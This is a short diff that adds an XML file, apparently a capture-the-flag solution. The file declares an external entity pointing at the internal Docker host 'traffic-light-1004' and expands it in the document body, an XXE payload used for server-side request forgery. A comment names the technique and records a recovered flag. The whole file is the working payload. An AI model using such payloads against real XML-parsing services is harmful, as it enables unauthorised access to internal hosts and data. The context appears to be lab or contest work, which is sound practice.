@@ -1,0 +1,12 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE hoge [
+<!ENTITY ef SYSTEM "http://traffic-light-1004">
+]>
+<root>
+  <content>&ef;</content>
+</root>
+
+<!-- 
+    SSRF to dockerhostname 'traffic-light-1004'
+    flag{shh_im_mining_bitcoin}
+    -->
